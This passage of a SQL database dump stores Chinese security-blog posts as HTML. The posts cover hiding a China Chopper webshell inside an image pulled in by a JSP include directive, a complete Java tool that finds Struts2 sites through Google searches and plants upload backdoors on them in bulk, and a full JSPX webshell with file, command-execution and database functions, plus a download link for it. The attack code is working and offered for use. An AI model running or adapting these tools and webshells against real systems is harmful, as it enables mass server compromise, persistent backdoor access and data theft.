14:45:02'), ('84', '1', '3', 'jsp include后门文件', '园长', '<span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \">jsp能像php asp什么的include后门文件吗？&nbsp;</span><br style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \" />\n<p><span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \">不可以吧，jsp只能include jsp文件吧？要不怎么没看见有人说过jsp include后门呢？&nbsp;</span><br style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \" /></p>\n<p><span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \">真的可以吗？为什么可以？如果&lt;%@ include可以那么&lt;jsp:include可不可以呢？</span><br /></p>\n<br />\n<p><b style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \">index.jsp包含1.jpg:</b><span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \">&nbsp;<br /></p>\n<br />\n<p><img alt=\"\" src=\"wp-content/uploads/ckfinder/images/1(3).jpg\" /></span><br /></p>\n<br />\n<p><b style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \">1.jpg内容是我们的菜刀一句话：<br /></p>\n<br />\n<p><img alt=\"\" src=\"wp-content/uploads/ckfinder/images/2(1).gif\" /><br /></p>\n<br />\n<p><b style=\"margin: 0px; padding: 0px; \">Server编译后index.jsp后：</b>&nbsp;<br /></p>\n<br />\n<p><img alt=\"\" src=\"wp-content/uploads/ckfinder/images/3.gif\" /><br /></p>\n<br />\n<p><b style=\"margin: 0px; padding: 0px; \">通过请求菜刀接口，可知程序正常http://xxx.com/Demo2/include/?z0=utf-8&amp;023=B&amp;z1=d:\\:</b>&nbsp;<br /></p>\n<br />\n<p><img alt=\"\" src=\"wp-content/uploads/ckfinder/images/4.gif\" /><br /></p>\n<br />\n<p>jsp会把包含进来的文件编译成一个servlet而&lt;jsp:include不会，一个是在编译阶段，一个是在请求阶段执行包含。&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p><br style=\"margin: 0px; padding: 0px; \" /></p>\n<code style=\"margin: 0px auto; padding: 4px 8px; display: block; font-family: \'Lucida Console\', \'Courier New\', Courier, mono, monospace; font-size: 12px; color: rgb(51, 51, 51); background-color: rgb(248, 248, 248); border: 1px solid rgb(204, 204, 204); line-height: 18px; overflow: auto; word-wrap: break-word; \">&lt;%@ include file=&quot;1.jpg&quot; %&gt;</code><br style=\"margin: 0px; padding: 0px; \" />\n<p><b style=\"margin: 0px; padding: 0px; \">file路径可以是d:/1.jpg之类的吗？</b>&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p><b style=\"margin: 0px; padding: 0px; \">不可以</b>，但是如果不在Web目录可能会在编译时出现500错误（测试环境Tomcat，找不到被包含的文件），多刷新一次就行了。这个问题可能是反复的(<b style=\"margin: 0px; padding: 0px; \">法克的@Xslsx小伙伴也测试了下，发现这个问题可能是编译问题，实际上不能这样去包含</b>，感谢Xslsx小伙伴)。&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>Resin3下的测试结果：&nbsp;<br /></p>\n<p><img alt=\"\" src=\"wp-content/uploads/ckfinder/images/5.gif\" /><br /></p>\n<br />\n<br />\n<p><b style=\"margin: 0px; padding: 0px; \">怎么去隐藏&lt;%@ include呢？</b>&nbsp;</b><br style=\"margin: 0px; padding: 0px; \" /></p>\n<p><b style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \">这个很简单，因为&lt;%@ include在开发当中用的非常多，所以很少有人会去怀疑包含进来的文件是不是安全的。&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p><br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>小知识，给大家见笑了。知道的同学呵呵下就行了。</b></p>', null, '2013-11-28 15:19:47', '1', '542', null, '0', '2013-11-28 15:19:47'), ('86', '1', '12', 'Struts2漏洞批量GetShell到MongoDb数据库', '园长', '<span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(248, 248, 248); \">这个很简单的，改下main的str的关键字就可以自动getshell并倒入mongodb数据库。</span><br style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(248, 248, 248); \" />\n<p><br style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(248, 248, 248); \" /></p>\n<p><span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(248, 248, 248); \">[只需要添加jsoup和mongodb的jar包]</span><br /></p>\n<br />\n<pre class=\"brush:java;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\nimport java.io.IOException;\nimport java.net.URL;\nimport java.net.URLConnection;\nimport java.net.UnknownHostException;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.logging.Logger;\nimport java.util.regex.Pattern;\nimport org.jsoup.Jsoup;\nimport org.jsoup.nodes.Document;\nimport org.jsoup.nodes.Element;\nimport org.jsoup.select.Elements;\nimport com.mongodb.BasicDBObject;\nimport com.mongodb.DB;\nimport com.mongodb.DBCollection;\nimport com.mongodb.DBObject;\nimport com.mongodb.Mongo;\npublic class StrutsTools {\n  private static String GETSHELLPOC1 = &quot;redirect:${%23req%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#39;),%23p%3d(%23req.getRealPath(%22/%22)%2b%22application.jsp%22).replaceAll(\\&quot;\\\\\\\\\\\\\\\\\\&quot;,\\&quot;/\\&quot;),new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close()}&amp;c=%3C%25if%28request.getParameter%28%22f%22%29%21%3Dnull%29%7B%28new%20java.io.FileOutputStream%28application.getRealPath%28%22%2F%22%29%2Brequest.getParameter%28%22f%22%29%29%29.write%28request.getParameter%28%22t%22%29.getBytes%28%29%29%3B%7Delse%7Bout.println%28%22%5B%2Fok%5D%22%29%3B%7D%25%3E&quot;;\n  public void log(String log){\n    Logger logger = Logger.getLogger(&quot;s2&quot;);\n    logger.info(log);\n  }\n  public void toSave(DBObject obj) {\n    try {\n      DB db = new Mongo(&quot;localhost&quot;, 27017).getDB(&quot;shell&quot;);\n      DBCollection conn = db.getCollection(&quot;shell&quot;);\n      conn.insert(obj);\n    } catch (UnknownHostException e) {\n      e.printStackTrace();\n    }\n  }\n  public void doGet(String url) {\n    try {\n      System.out.println(url);\n      URL realUrl = new URL(url);\n      URLConnection connection = realUrl.openConnection();\n      connection.setConnectTimeout(3000);\n      connection.setReadTimeout(3000);\n      connection.connect();\n      connection.getInputStream();\n    } catch (Exception e) {\n      log(e.toString());\n    }\n  }\n  /**\n   * 简单的转换下google的编码\n   * @param url\n   * @return\n   */\n  public String toURL(String url){\n    url = url.replace(&quot;%3F&quot;, &quot;?&quot;);\n    url = url.replace(&quot;%3f&quot;, &quot;?&quot;);\n    url = url.replaceAll(&quot;%3d&quot;, &quot;=&quot;);\n    url = url.replaceAll(&quot;%3D&quot;, &quot;=&quot;);\n    url = url.replaceAll(&quot;%26&quot;, &quot;&amp;&quot;);\n    return url;\n  }\n  public void getShell(String url){\n    try {\n      doGet(url+(url.indexOf(&quot;?&quot;)!=-1?&quot;&amp;&quot;:&quot;?&quot;)+GETSHELLPOC1);\n      URL l = new URL(url);\n      String host = url.substring(0,url.indexOf(l.getFile()));\n      Document doc = Jsoup.connect(host+&quot;/application.jsp&quot;).userAgent(&quot;Googlebot/2.1 (+http://www.googlebot.com/bot.html&quot;).timeout(3000).get();\n      if(doc.toString().indexOf(&quot;[/ok]&quot;)!=-1){\n        DBObject obj = new BasicDBObject(); \n                obj.put(&quot;shell&quot;, host+&quot;/application.jsp&quot;); \n                toSave(obj);\n      }\n    } catch (IOException e) {\n      log(e.toString());\n    }\n  }\n  public void test(String url){\n    try {\n      Document doc = Jsoup.connect(url).userAgent(&quot;Googlebot/2.1 (+http://www.googlebot.com/bot.html&quot;).timeout(3000).get();\n      Elements element = doc.getElementsByClass(&quot;r&quot;);\n      List&lt;String&gt; ls = new ArrayList&lt;String&gt;();\n      for(Element e : element){\n        Elements a = e.getElementsByTag(&quot;a&quot;);\n        for(Element b : a){\n          String s = b.attr(&quot;href&quot;).replace(&quot;/url?q=&quot;, &quot;&quot;);\n          URL u = new URL(s);\n          String host = s.substring(0,s.indexOf(u.getFile()));\n          if(!Pattern.compile(host).matcher(ls.toString()).find()){\n            ls.add(s);\n          }\n        }\n      }\n//      System.out.println(ls.toString());\n      for(String s:ls){\n        getShell(toURL(s.substring(0,s.indexOf(&quot;&amp;sa=U&amp;ei=&quot;))));\n      }\n    } catch (IOException e) {\n      log(e.toString());\n    }\n  }\n  public static void main(String[] args) {\n    String str = &quot;passwordRecover.action,login,show,article,list,shop,admin,service,index&quot;;\n    String[] s = str.split(&quot;,&quot;);\n    for(String b:s){\n      for (int i = 0; i &lt; 5; i++) {\n        String url = &quot;http://www.google.ws/search?q=filetype:action+inurl:&quot;+b+&quot;&amp;num=100&amp;newwindow=1&amp;ei=eOl3UqXUL8eTiAfHiYDICw&amp;start=&quot;+(i*100)+&quot;&amp;sa=N&amp;biw=1366&amp;bih=578&quot;;\n        StrutsTools p = new StrutsTools();\n        p.test(url);\n      }\n    }\n  }\n}\n</pre>\n<br />\n<br />', null, '2013-11-28 15:33:25', '1', '621', null, '2', '2013-11-28 15:33:25');
INSERT INTO `sys_posts` VALUES ('88', '1', '12', '两种“新型”的javaweb后门(jspx和Java Logger)', '园长', '<span style=\"color: #444444; font-family: Tahoma, \'Microsoft Yahei\', Simsun; font-size: 14px; line-height: 21px; background-color: #ffffff;\">关于JavaWeb后门问题一直以来都比较少，而比较新奇的后门更少。在这里我分享两个我最近搞的比较有意思的JavaWeb后门给大家玩。一个常见或者比较普通的后门很容易就会被拦截或者被发现，但不知道有朋友了解下面两种后门没？ </span>\n<p><strong style=\"word-wrap: break-word; color: #444444; font-family: Tahoma, \'Microsoft Yahei\', Simsun; font-size: 14px; line-height: 21px; background-color: #ffffff;\">1：jspx后门 </strong></p>\n<p><span style=\"color: #444444; font-family: Tahoma, \'Microsoft Yahei\', Simsun; font-size: 14px; line-height: 21px; background-color: #ffffff;\">在如今的web应用当中如果想直接传个jsp已经变得比较难了，但是如果只限制了asp、php、jsp、aspx等这些常见的后缀应该怎样去突破呢？我在读tomcat的配置文件的时候看到jsp和jspx都是由org.apache.jasper.servlet.JspServlet处理，于是想构建一个jspx的webshell。经过反复的折腾，一个jspx的后门就粗线了。测试应该是java的所有的server都默认支持。 </span></p>\n<p><strong style=\"word-wrap: break-word; color: #444444; font-family: Tahoma, \'Microsoft Yahei\', Simsun; font-size: 14px; line-height: 21px; background-color: #ffffff;\">Tomcat的conf/web.xml下的配置：</strong></p>\n<pre class=\"brush:xml;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">&lt;servlet&gt; \n        &lt;servlet-name&gt;jsp&lt;/servlet-name&gt; \n        &lt;servlet-class&gt;org.apache.jasper.servlet.JspServlet&lt;/servlet-class&gt; \n        &lt;init-param&gt; \n            &lt;param-name&gt;fork&lt;/param-name&gt; \n            &lt;param-value&gt;false&lt;/param-value&gt; \n        &lt;/init-param&gt; \n        &lt;init-param&gt; \n            &lt;param-name&gt;xpoweredBy&lt;/param-name&gt; \n            &lt;param-value&gt;false&lt;/param-value&gt; \n        &lt;/init-param&gt; \n        &lt;load-on-startup&gt;3&lt;/load-on-startup&gt; \n    &lt;/servlet&gt; \n&lt;servlet-mapping&gt; \n        &lt;servlet-name&gt;jsp&lt;/servlet-name&gt; \n        &lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt; \n        &lt;url-pattern&gt;*.jspx&lt;/url-pattern&gt; \n    &lt;/servlet-mapping&gt;</pre>\n<p><strong style=\"word-wrap: break-word; color: #444444; font-family: Tahoma, \'Microsoft Yahei\', Simsun; font-size: 14px; line-height: 21px; background-color: #ffffff;\"><a style=\"word-wrap: break-word; color: #336699;\" href=\"http://jspx-bay.sourceforge.net/\" target=\"_blank\">http://jspx-bay.sourceforge.net</a> <br style=\"word-wrap: break-word;\" /></strong></p>\n<p><a style=\"word-wrap: break-word; color: #336699;\" href=\"http://blog.sina.com.cn/s/blog_4b6de6bb0100089s.html\" target=\"_blank\">关于 jspx 文件的一些说明 </a></p>\n<p><strong style=\"word-wrap: break-word; color: #444444; font-family: Tahoma, \'Microsoft Yahei\', Simsun; font-size: 14px; line-height: 21px; background-color: #ffffff;\">重点在于把Jsp里面的一些标记转换成xml支持的格式，比如： <br style=\"word-wrap: break-word;\" /></strong></p>\n<p>&lt;%@ include .. %&gt;                      &lt;jsp:directive.include .. /&gt;</p>\n<p>&lt;%@ page .. %&gt;                         &lt;jsp:directive.page .. /&gt;</p>\n<p>&lt;%@ taglib .. %&gt;                        xmlns:prefix=\"tag library URL\"</p>\n<p>&lt;%= ..%&gt;                                  &lt;jsp:expression&gt; .. &lt;/jsp:expression&gt;</p>\n<p>&lt;% ..%&gt;                                    &lt;jsp:scriptlet&gt; .. &lt;/jsp:scriptlet&gt;</p>\n<p>知道&lt;% %&gt;可以用&lt;jsp:scriptlet&gt;&lt;/jsp:scriptlet&gt;标记表示那么做起来就很简单了，直接把标记换下是非常容易做的。所以写个简单的shell一个就很简单了，但是如果想知道具体有那些标签或者说跟jsp里面的有那些不同怎么办呢？下面我简单的做了下对比（前面是jsp的代码提示，后面是jspx）：</p>\n<p><strong style=\"word-wrap: break-word; color: #444444; font-family: Tahoma, \'Microsoft Yahei\', Simsun; font-size: 14px; line-height: 21px; background-color: #ffffff;\"><img src=\"wp-content/uploads/ckfinder/images/1.gif\" alt=\"\" /></strong></p>\n<p><strong style=\"word-wrap: break-word; color: #444444; font-family: Tahoma, \'Microsoft Yahei\', Simsun; font-size: 14px; line-height: 21px; background-color: #ffffff;\"><span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; line-height: 22px;\">照着提示翻译下得知表示jsp里面的&lt;%! %&gt;需要用：&lt;jsp:declaration&gt;&lt;/jsp:declaration&gt;标签去替换就行了。 </span><br style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; line-height: 22px;\" /></strong></p>\n<p><strong style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; line-height: 22px;\">其他重要提醒：</strong><span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; line-height: 22px;\"> </span></p>\n<p><span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; line-height: 22px;\">    在jspx里面遵循xml语法所以直接在jsp:declaration或者jsp:scriptlet标签内写\"&lt;&gt;\"这样的符号是不行的，需要转意（不转意会报编译错误，猜了下只需要把&lt;&gt;转成&amp;lt;   &amp;gt;就行了）。 </span></p>\n<p><strong style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; line-height: 22px;\">jspx后门的具体实现代码：</strong><span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; line-height: 22px;\"> </span></p>\n<p><div></p>\n<pre class=\"brush: java; gutter: true\">&lt;jsp:root xmlns:jsp=&quot;http://java.sun.com/JSP/Page&quot; \n  xmlns=&quot;http://www.w3.org/1999/xhtml&quot; \n  xmlns:c=&quot;http://java.sun.com/jsp/jstl/core&quot; version=&quot;1.2&quot;&gt; \n  &lt;jsp:directive.page contentType=&quot;text/html&quot; pageEncoding=&quot;UTF-8&quot; /&gt; \n  &lt;jsp:directive.page import=&quot;java.io.*&quot; /&gt; \n  &lt;jsp:scriptlet&gt; \n    RandomAccessFile rf = new RandomAccessFile(request.getRealPath(&quot;/&quot;)+request.getParameter(&quot;f&quot;), &quot;rw&quot;); \n    rf.write(request.getParameter(&quot;t&quot;).getBytes()); \n    rf.close(); \n  &lt;/jsp:scriptlet&gt; \n&lt;/jsp:root&gt;</pre>\n<p></div></p>\n<p><strong style=\"word-wrap: break-word; color: #444444; font-family: Tahoma, \'Microsoft Yahei\', Simsun; font-size: 14px; line-height: 21px; background-color: #ffffff;\"><strong style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; line-height: 22px;\">jspx实现的我之前发的菜刀最终版：</strong><span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; line-height: 22px;\"> </span></strong></p>\n<p><strong style=\"word-wrap: break-word; color: #444444; font-family: Tahoma, \'Microsoft Yahei\', Simsun; font-size: 14px; line-height: 21px; background-color: #ffffff;\"><span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; line-height: 22px;\">直接用菜刀连接：http://localhost:8080/jspx.jspx </span></strong></p>\n<p><strong style=\"word-wrap: break-word; color: #444444; font-family: Tahoma, \'Microsoft Yahei\', Simsun; font-size: 14px; line-height: 21px; background-color: #ffffff;\"><img src=\"wp-content/uploads/ckfinder/images/1(1).gif\" alt=\"\" /></strong></p>\n<pre class=\"brush: java; gutter: true\">&lt;jsp:root xmlns:jsp=&quot;http://java.sun.com/JSP/Page&quot; xmlns=&quot;http://www.w3.org/1999/xhtml&quot; xmlns:c=&quot;http://java.sun.com/jsp/jstl/core&quot; version=&quot;1.2&quot;&gt;&lt;jsp:directive.page contentType=&quot;text/html&quot; pageEncoding=&quot;UTF-8&quot; /&gt;&lt;jsp:directive.page import=&quot;java.io.*&quot;/&gt;&lt;jsp:directive.page import=&quot;java.util.*&quot;/&gt;&lt;jsp:directive.page import=&quot;java.net.*&quot;/&gt;&lt;jsp:directive.page import=&quot;java.sql.*&quot;/&gt;&lt;jsp:directive.page import=&quot;java.text.*&quot;/&gt;&lt;jsp:declaration&gt;String Pwd=&quot;023&quot;;String cs=&quot;UTF-8&quot;;String EC(String s)throws Exception{return new String(s.getBytes(&quot;ISO-8859-1&quot;),cs);}Connection GC(String s)throws Exception{String[] x=s.trim().split(&quot;\\r\\n&quot;);Class.forName(x[0].trim());if(x[1].indexOf(&quot;jdbc:oracle&quot;)!=-1){return DriverManager.getConnection(x[1].trim()+&quot;:&quot;+x[4],x[2].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[2],x[3].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[3]);}else{Connection c=DriverManager.getConnection(x[1].trim(),x[2].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[2],x[3].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[3]);if(x.length&gt;4){c.setCatalog(x[4]);}return c;}}void AA(StringBuffer sb)throws Exception{File r[]=File.listRoots();for(int i=0;i&amp;lt;r.length;i++){sb.append(r[i].toString().substring(0,2));}}void BB(String s,StringBuffer sb)throws Exception{File oF=new File(s),l[]=oF.listFiles();String sT,sQ,sF=&quot;&quot;;java.util.Date dt;SimpleDateFormat fm=new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);for(int i=0; i&amp;lt;l.length; i++){dt=new java.util.Date(l[i].lastModified());sT=fm.format(dt);sQ=l[i].canRead()?&quot;R&quot;:&quot;&quot;;sQ +=l[i].canWrite()?&quot; W&quot;:&quot;&quot;;if(l[i].isDirectory()){sb.append(l[i].getName()+&quot;/\\t&quot;+sT+&quot;\\t&quot;+l[i].length()+&quot;\\t&quot;+sQ+&quot;\\n&quot;);}else{sF+=l[i].getName()+&quot;\\t&quot;+sT+&quot;\\t&quot;+l[i].length()+&quot;\\t&quot;+sQ+&quot;\\n&quot;;}}sb.append(sF);}void EE(String s)throws Exception{File f=new File(s);if(f.isDirectory()){File x[]=f.listFiles();for(int k=0; k &amp;lt; x.length; k++){if(!x[k].delete()){EE(x[k].getPath());}}}f.delete();}void FF(String s,HttpServletResponse r)throws Exception{int n;byte[] b=new byte[512];r.reset();ServletOutputStream os=r.getOutputStream();BufferedInputStream is=new BufferedInputStream(new FileInputStream(s));os.write((&quot;-&gt;&quot;+&quot;|&quot;).getBytes(),0,3);while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}os.write((&quot;|&quot;+&quot;&amp;lt;-&quot;).getBytes(),0,3);os.close();is.close();}void GG(String s,String d)throws Exception{String h=&quot;0123456789ABCDEF&quot;;File f=new File(s);f.createNewFile();FileOutputStream os=new FileOutputStream(f);for(int i=0; i&amp;lt;d.length();i+=2){os.write((h.indexOf(d.charAt(i)) &amp;lt;&amp;lt; 4 | h.indexOf(d.charAt(i+1))));}os.close();}void HH(String s,String d)throws Exception{File sf=new File(s),df=new File(d);if(sf.isDirectory()){if(!df.exists()){df.mkdir();}File z[]=sf.listFiles();for(int j=0; j&amp;lt;z.length; j++){HH(s+&quot;/&quot;+z[j].getName(),d+&quot;/&quot;+z[j].getName());}}else{FileInputStream is=new FileInputStream(sf);FileOutputStream os=new FileOutputStream(df);int n;byte[] b=new byte[512];while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}is.close();os.close();}}void II(String s,String d)throws Exception{File sf=new File(s),df=new File(d);sf.renameTo(df);}void JJ(String s)throws Exception{File f=new File(s);f.mkdir();}void KK(String s,String t)throws Exception{File f=new File(s);SimpleDateFormat fm=new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);java.util.Date dt=fm.parse(t);f.setLastModified(dt.getTime());}void LL(String s,String d)throws Exception{URL u=new URL(s);int n=0;FileOutputStream os=new FileOutputStream(d);HttpURLConnection h=(HttpURLConnection) u.openConnection();InputStream is=h.getInputStream();byte[] b=new byte[512];while((n=is.read(b))!=-1){os.write(b,0,n);}os.close();is.close();h.disconnect();}void MM(InputStream is,StringBuffer sb)throws Exception{String l;BufferedReader br=new BufferedReader(new InputStreamReader(is));while((l=br.readLine())!=null){sb.append(l+&quot;\\r\\n&quot;);}}void NN(String s,StringBuffer sb)throws Exception{Connection c=GC(s);ResultSet r=s.indexOf(&quot;jdbc:oracle&quot;)!=-1?c.getMetaData().getSchemas():c.getMetaData().getCatalogs();while(r.next()){sb.append(r.getString(1)+&quot;\\t&quot;);}r.close();c.close();}void OO(String s,StringBuffer sb)throws Exception{Connection c=GC(s);String[] x=s.trim().split(&quot;\\r\\n&quot;);ResultSet r=c.getMetaData().getTables(null,s.indexOf(&quot;jdbc:oracle&quot;)!=-1?x.length&gt;5?x[5]:x[4]:null,&quot;%&quot;,new String[]{&quot;TABLE&quot;});while(r.next()){sb.append(r.getString(&quot;TABLE_NAME&quot;)+&quot;\\t&quot;);}r.close();c.close();}void PP(String s,StringBuffer sb)throws Exception{String[] x=s.trim().split(&quot;\\r\\n&quot;);Connection c=GC(s);Statement m=c.createStatement(1005,1007);ResultSet r=m.executeQuery(&quot;select * from &quot;+x[x.length-1]);ResultSetMetaData d=r.getMetaData();for(int i=1;i&amp;lt;=d.getColumnCount();i++){sb.append(d.getColumnName(i)+&quot; (&quot;+d.getColumnTypeName(i)+&quot;)\\t&quot;);}r.close();m.close();c.close();}void QQ(String cs,String s,String q,StringBuffer sb,String p)throws Exception{Connection c=GC(s);Statement m=c.createStatement(1005,1008);BufferedWriter bw=null;try{ResultSet r=m.executeQuery(q.indexOf(&quot;--f:&quot;)!=-1?q.substring(0,q.indexOf(&quot;--f:&quot;)):q);ResultSetMetaData d=r.getMetaData();int n=d.getColumnCount();for(int i=1; i &amp;lt;=n; i++){sb.append(d.getColumnName(i)+&quot;\\t|\\t&quot;);}sb.append(&quot;\\r\\n&quot;);if(q.indexOf(&quot;--f:&quot;)!=-1){File file=new File(p);if(q.indexOf(&quot;-to:&quot;)==-1){file.mkdir();}bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(q.indexOf(&quot;-to:&quot;)!=-1?p.trim():p+q.substring(q.indexOf(&quot;--f:&quot;)+4,q.length()).trim()),true),cs));}while(r.next()){for(int i=1; i&amp;lt;=n;i++){if(q.indexOf(&quot;--f:&quot;)!=-1){bw.write(r.getObject(i)+&quot;&quot;+&quot;\\t&quot;);bw.flush();}else{sb.append(r.getObject(i)+&quot;&quot;+&quot;\\t|\\t&quot;);}}if(bw!=null){bw.newLine();}sb.append(&quot;\\r\\n&quot;);}r.close();if(bw!=null){bw.close();}}catch(Exception e){sb.append(&quot;Result\\t|\\t\\r\\n&quot;);try{m.executeUpdate(q);sb.append(&quot;Execute Successfully!\\t|\\t\\r\\n&quot;);}catch(Exception ee){sb.append(ee.toString()+&quot;\\t|\\t\\r\\n&quot;);}}m.close();c.close();}&lt;/jsp:declaration&gt;&lt;jsp:scriptlet&gt;cs=request.getParameter(&quot;z0&quot;)!=null?request.getParameter(&quot;z0&quot;)+&quot;&quot;:cs;response.setContentType(&quot;text/html&quot;);response.setCharacterEncoding(cs);StringBuffer sb=new StringBuffer(&quot;&quot;);try{String Z=EC(request.getParameter(Pwd)+&quot;&quot;);String z1=EC(request.getParameter(&quot;z1&quot;)+&quot;&quot;);String z2=EC(request.getParameter(&quot;z2&quot;)+&quot;&quot;);sb.append(&quot;-&gt;&quot;+&quot;|&quot;);String s=request.getSession().getServletContext().getRealPath(&quot;/&quot;);if(Z.equals(&quot;A&quot;)){sb.append(s+&quot;\\t&quot;);if(!s.substring(0,1).equals(&quot;/&quot;)){AA(sb);}}else if(Z.equals(&quot;B&quot;)){BB(z1,sb);}else if(Z.equals(&quot;C&quot;)){String l=&quot;&quot;;BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));while((l=br.readLine())!=null){sb.append(l+&quot;\\r\\n&quot;);}br.close();}else if(Z.equals(&quot;D&quot;)){BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));bw.write(z2);bw.close();sb.append(&quot;1&quot;);}else if(Z.equals(&quot;E&quot;)){EE(z1);sb.append(&quot;1&quot;);}else if(Z.equals(&quot;F&quot;)){FF(z1,response);}else if(Z.equals(&quot;G&quot;)){GG(z1,z2);sb.append(&quot;1&quot;);}else if(Z.equals(&quot;H&quot;)){HH(z1,z2);sb.append(&quot;1&quot;);}else if(Z.equals(&quot;I&quot;)){II(z1,z2);sb.append(&quot;1&quot;);}else if(Z.equals(&quot;J&quot;)){JJ(z1);sb.append(&quot;1&quot;);}else if(Z.equals(&quot;K&quot;)){KK(z1,z2);sb.append(&quot;1&quot;);}else if(Z.equals(&quot;L&quot;)){LL(z1,z2);sb.append(&quot;1&quot;);}else if(Z.equals(&quot;M&quot;)){String[] c={z1.substring(2),z1.substring(0,2),z2};Process p=Runtime.getRuntime().exec(c);MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb);}else if(Z.equals(&quot;N&quot;)){NN(z1,sb);}else if(Z.equals(&quot;O&quot;)){OO(z1,sb);}else if(Z.equals(&quot;P&quot;)){PP(z1,sb);}else if(Z.equals(&quot;Q&quot;)){QQ(cs,z1,z2,sb,z2.indexOf(&quot;-to:&quot;)!=-1?z2.substring(z2.indexOf(&quot;-to:&quot;)+4,z2.length()):s.replaceAll(&quot;\\\\\\\\&quot;,&quot;/&quot;)+&quot;images/&quot;);}}catch(Exception e){sb.append(&quot;ERROR&quot;+&quot;:// &quot;+e.toString());}sb.append(&quot;|&quot;+&quot;&amp;lt;-&quot;);out.print(sb.toString());&lt;/jsp:scriptlet&gt;&lt;/jsp:root&gt;</pre>\n<span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; line-height: 22px;\">最终版的使用说明：http://xsser.me/caidao/1.txt </span>\n<strong style=\"word-wrap: break-word; color: #444444; font-family: Tahoma, \'Microsoft Yahei\', Simsun; font-size: 14px; line-height: 21px; background-color: #ffffff;\"><span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; line-height: 22px;\">上面的jspx.jspx下载地址：http://xsser.me/caidao/jspx.jspx </span></strong>\n<strong style=\"word-wrap: break-word; color: #444444; font-family: Tahoma, \'Microsoft Yahei\', Simsun; font-size: 14px; line-height: 21px; background-color: #ffffff;\"><strong style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; line-height: 22px;\">2：用Java Logger（日志）留后门</strong><span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; line-height: 22px;\"> </span></strong>\n<strong style=\"word-wrap: break-word; color: #444444; font-family: Tahoma, \'Microsoft Yahei\', Simsun; font-size: 14px; line-height: 21px; background-color: #ffffff;\"><span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; line-height: 22px;\">    某些场景下shell可能被过滤掉了，但是利用一些有趣的东东可以绕过，比如不用new 